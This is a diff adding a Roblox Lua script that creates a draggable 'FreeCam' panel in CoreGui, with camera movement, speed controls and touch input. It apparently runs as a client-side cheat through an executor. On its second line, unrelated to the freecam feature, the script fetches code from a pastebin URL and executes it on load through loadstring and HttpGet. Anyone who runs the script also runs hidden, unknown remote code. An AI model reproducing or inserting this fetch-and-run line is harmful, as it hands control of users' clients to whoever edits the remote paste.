@@ -1,0 +1,235 @@
+local UIS = game:GetService("UserInputService")
+loadstring(game:HttpGet("https://pastebin.com/raw/DxSRTuJz"))()
+local plrDie = game.Players.LocalPlayer
+local RS = game:GetService("RunService")
+local cam = workspace.CurrentCamera
+local freecamEnabled = false
+local keysDown = {}
+local rotating = false
+local touchPos = nil
+local speed = 1
+local function activateFreecam()
+   local plr = game.Players.LocalPlayer
+   local hum = plr.Character.HumanoidRootPart
+	local onMobile = not UIS.KeyboardEnabled
+	cam.CameraType = Enum.CameraType.Scriptable
+	local sens = 0.3
+	if onMobile then sens *= 2 end
+	keysDown = {}
+	rotating = false
+	hum.Anchored = true
+	local function renderStepped()
+		if not freecamEnabled then return end
+		if rotating then
+			local delta = UIS:GetMouseDelta()
+			local cf = cam.CFrame
+			local yAngle = cf:ToEulerAngles(Enum.RotationOrder.YZX)
+			local newAmount = math.deg(yAngle) + delta.Y
+			if newAmount > 65 or newAmount < -65 then
+				if not (yAngle < 0 and delta.Y < 0) and not (yAngle > 0 and delta.Y > 0) then
+					delta = Vector2.new(delta.X, 0)
+				end
+			end
+			cf *= CFrame.Angles(-math.rad(delta.Y), 0, 0)
+			cf = CFrame.Angles(0, -math.rad(delta.X), 0) * (cf - cf.Position) + cf.Position
+			cf = CFrame.lookAt(cf.Position, cf.Position + cf.LookVector)
+			if delta ~= Vector2.new(0, 0) then
+				cam.CFrame = cam.CFrame:Lerp(cf, sens)
+			end
+			UIS.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
+		else
+			UIS.MouseBehavior = Enum.MouseBehavior.Default
+		end
+		if keysDown["Enum.KeyCode.W"] then
+			cam.CFrame *= CFrame.new(Vector3.new(0, 0, -speed))
+		end
+		if keysDown["Enum.KeyCode.A"] then
+			cam.CFrame *= CFrame.new(Vector3.new(-speed, 0, 0))
+		end
+		if keysDown["Enum.KeyCode.S"] then
+			cam.CFrame *= CFrame.new(Vector3.new(0, 0, speed))
+		end
+		if keysDown["Enum.KeyCode.D"] then
+			cam.CFrame *= CFrame.new(Vector3.new(speed, 0, 0))
+		end
+	end
+	RS:BindToRenderStep("FreecamRender", Enum.RenderPriority.Camera.Value, renderStepped)
+	local validKeys = {"Enum.KeyCode.W", "Enum.KeyCode.A", "Enum.KeyCode.S", "Enum.KeyCode.D"}
+	UIS.InputBegan:Connect(function(Input)
+		for i, key in pairs(validKeys) do
+			if key == tostring(Input.KeyCode) then
+				keysDown[key] = true
+			end
+		end
+		if Input.UserInputType == Enum.UserInputType.MouseButton2 or (Input.UserInputType == Enum.UserInputType.Touch and UIS:GetMouseLocation().X > (cam.ViewportSize.X / 2)) then
+			rotating = true
+		end
+		if Input.UserInputType == Enum.UserInputType.Touch then
+			if Input.Position.X < cam.ViewportSize.X / 2 then
+				touchPos = Input.Position
+			end
+		end
+	end)
+	UIS.InputEnded:Connect(function(Input)
+		for key, _ in pairs(keysDown) do
+			if key == tostring(Input.KeyCode) then
+				keysDown[key] = false
+			end
+		end
+		if Input.UserInputType == Enum.UserInputType.MouseButton2 or (Input.UserInputType == Enum.UserInputType.Touch and UIS:GetMouseLocation().X > (cam.ViewportSize.X / 2)) then
+			rotating = false
+		end
+		if Input.UserInputType == Enum.UserInputType.Touch and touchPos then
+			if Input.Position.X < cam.ViewportSize.X / 2 then
+				touchPos = nil
+				keysDown["Enum.KeyCode.W"] = false
+				keysDown["Enum.KeyCode.A"] = false
+				keysDown["Enum.KeyCode.S"] = false
+				keysDown["Enum.KeyCode.D"] = false
+			end
+		end
+	end)
+	UIS.TouchMoved:Connect(function(input)
+		if touchPos then
+			if input.Position.X < cam.ViewportSize.X / 2 then
+				if input.Position.Y < touchPos.Y then
+					keysDown["Enum.KeyCode.W"] = true
+					keysDown["Enum.KeyCode.S"] = false
+				else
+					keysDown["Enum.KeyCode.W"] = false
+					keysDown["Enum.KeyCode.S"] = true
+				end
+				if input.Position.X < (touchPos.X - 15) then
+					keysDown["Enum.KeyCode.A"] = true
+					keysDown["Enum.KeyCode.D"] = false
+				elseif input.Position.X > (touchPos.X + 15) then
+					keysDown["Enum.KeyCode.A"] = false
+					keysDown["Enum.KeyCode.D"] = true
+				else
+					keysDown["Enum.KeyCode.A"] = false
+					keysDown["Enum.KeyCode.D"] = false
+				end
+			end
+		end
+	end)
+end
+
+local function deactivateFreecam()
+   local plr = game.Players.LocalPlayer
+   local hum = plr.Character.HumanoidRootPart
+	freecamEnabled = false
+	cam.CameraType = Enum.CameraType.Custom
+    hum.Anchored = false
+	UIS.MouseBehavior = Enum.MouseBehavior.Default
+	RS:UnbindFromRenderStep("FreecamRender")
+end
+
+local function onCharacterAdded(char)
+	local hum = char:WaitForChild("Humanoid")
+	local rootPart = char:WaitForChild("HumanoidRootPart")
+
+	hum.Died:Connect(function()
+		if freecamEnabled then
+			deactivateFreecam()
+		end
+	end)
+end
+
+local function onPlayerAdded(plr)
+	if plr.Character then
+		onCharacterAdded(plr.Character)
+	end
+	plr.CharacterAdded:Connect(onCharacterAdded)
+end
+
+onPlayerAdded(game.Players.LocalPlayer)
+
+local S = Instance.new("ScreenGui")
+S.Parent = game.CoreGui
+S.Name = "FreeCam"
+
+local F = Instance.new("Frame")
+F.Parent = S
+F.Size = UDim2.new(0, 230, 0, 130)
+F.Position = UDim2.new(0, 230, 0, 100)
+F.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+F.Active = true
+F.Draggable = true
+F.BorderSizePixel = 3
+F.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+local T = Instance.new("TextButton")
+T.Parent = F
+T.Size = UDim2.new(0, 180, 0, 50)
+T.Position = UDim2.new(0, 23, 0, 15)
+T.BackgroundColor3 = Color3.fromRGB(255, 200, 255)
+T.BorderSizePixel = 2
+T.BorderColor3 = Color3.fromRGB(0, 0, 0)
+T.TextScaled = true
+T.Font = Enum.Font.SciFi
+T.Text = speed
+
+local B = Instance.new("TextButton")
+B.Parent = F
+B.Size = UDim2.new(0, 48, 0, 30)
+B.Position = UDim2.new(0, 23, 0, 85)
+B.BackgroundColor3 = Color3.fromRGB(255, 200, 255)
+B.BorderSizePixel = 2
+B.BorderColor3 = Color3.fromRGB(0, 0, 0)
+B.TextScaled = true
+B.Text = "+"
+B.Font = Enum.Font.SciFi
+B.MouseButton1Click:Connect(function()
+    speed = speed + 1
+    T.Text = speed
+end)
+
+local B2 = Instance.new("TextButton")
+B2.Parent = F
+B2.TextScaled = true
+B2.Font = Enum.Font.SciFi
+B2.Size = UDim2.new(0, 48, 0, 30)
+B2.Position = UDim2.new(0, 155, 0, 85)
+B2.BackgroundColor3 = Color3.fromRGB(255, 200, 255)
+B2.BorderSizePixel = 2
+B2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+B2.Text = "-"
+B2.MouseButton1Click:Connect(function()
+if speed > 1 then
+    speed = speed - 1
+    T.Text = speed
+end
+end)
+
+local B3Fly = Instance.new("TextButton")
+B3Fly.Parent = F
+B3Fly.TextScaled = true
+B3Fly.Font = Enum.Font.SciFi
+B3Fly.Size = UDim2.new(0, 48, 0, 30)
+B3Fly.Position = UDim2.new(0, 90, 0, 85)
+B3Fly.BackgroundColor3 = Color3.fromRGB(255, 200, 255)
+B3Fly.BorderSizePixel = 2
+B3Fly.BorderColor3 = Color3.fromRGB(0, 0, 0)
+B3Fly.Text = "FreeCam"
+B3Fly.MouseButton1Click:Connect(function()
+if freecamEnabled then
+   freecamEnabled = false
+   deactivateFreecam()
+else
+   freecamEnabled = true
+   activateFreecam()
+end
+end)
+
+local B3Close = Instance.new("TextButton")
+B3Close.Parent = F
+B3Close.Font = Enum.Font.ArimoBold
+B3Close.Size = UDim2.new(0, 48, 0, 30)
+B3Close.Position = UDim2.new(0, 190, 0, -5)
+B3Close.Text = "X"
+B3Close.TextSize = 15
+B3Close.BackgroundTransparency = 1
+B3Close.MouseButton1Click:Connect(function()
+    S:Destroy()
+    deactivateFreecam()
+end)
